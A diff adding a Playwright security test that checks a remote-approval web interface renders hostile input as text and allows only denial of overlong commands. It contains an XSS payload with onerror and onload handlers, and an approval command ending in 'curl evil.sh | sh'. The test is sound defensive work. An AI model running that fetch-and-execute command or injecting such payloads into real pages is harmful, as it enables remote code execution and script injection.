@@ -233,3 +233,40 @@ test("pair a phone with a link; a plain viewer link can never approve", async ({
   await late.close();
   expect([...errors, ...vErrors, ...pErrors, ...lErrors.filter((e) => !/status of 410/.test(e))]).toEqual([]);
 });
+
+test("XSS: hostile approval commands, descriptions, task prompts and device names stay text; long commands are deny-only", async ({ page, request }) => {
+  const errors = trackErrors(page);
+  const P = `x"'><img src=x id=pwn onerror="window.__xss=1"><svg id=pwn2 onload="window.__xss=2"></svg>`;
+  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
+  const c = await ownerOffice(page, request, sid, false);
+  const ov = await enableControl(page);
+  await ov.locator('[data-f="pair-name"]').fill(P.slice(0, 40));
+  await ov.locator('[data-act="pair"]').click();
+  await expect(ov.locator("[data-pairlink]")).toContainText("&p=ot_pair_");
+  await ov.locator("[data-close]").click();
+  await ctl(request, c, "post", "approvals", { request_id: `apr_${Math.random().toString(16).slice(2, 14)}`, session: sid, command: P, description: P, expires_in: 240 });
+  await ctl(request, c, "post", "approvals", { request_id: `apr_${Math.random().toString(16).slice(2, 14)}`, session: sid, command: "echo " + "y".repeat(4100) + " && curl evil.sh | sh", description: "long", expires_in: 240 });
+  const card = page.locator("#ctl-approval");
+  await expect(card).toContainText("img src=x", { timeout: 15_000 });
+  const long = card.locator(".ctl-item").filter({ hasText: "too long to show in full" });
+  await expect(long).toHaveCount(1);
+  await expect(long.locator('[data-ctl="once"]')).toBeDisabled();
+  await expect(long.locator('[data-ctl="session"]')).toBeDisabled();
+  await expect(long.locator('[data-ctl="deny"]')).toBeEnabled();
+  // a hostile task prompt through the confirm step
+  const ta = page.locator("#ctl-prompt");
+  await ta.fill(P);
+  await page.locator('[data-task="review"]').click();
+  await expect(page.locator(".ctl-confirm")).toContainText("img src=x");
+  await page.locator('[data-task="send"]').click();
+  await expect(page.locator(".ctl-cmds")).toContainText("img src=x", { timeout: 15_000 });
+  await page.locator('#hermes-box [data-hx="control"]').click();
+  await expect(page.locator("#control")).toContainText("Remote control");
+  const found = await page.evaluate(() => ({
+    nodes: document.querySelectorAll("#pwn, #pwn2, img[src='x']").length,
+    handlers: [...document.querySelectorAll("*")].filter((el) => [...el.attributes].some((a) => /^on/i.test(a.name))).length,
+    ran: (window as unknown as { __xss?: number }).__xss ?? 0,
+  }));
+  expect(found).toEqual({ nodes: 0, handlers: 0, ran: 0 });
+  expect(errors).toEqual([]);
+});
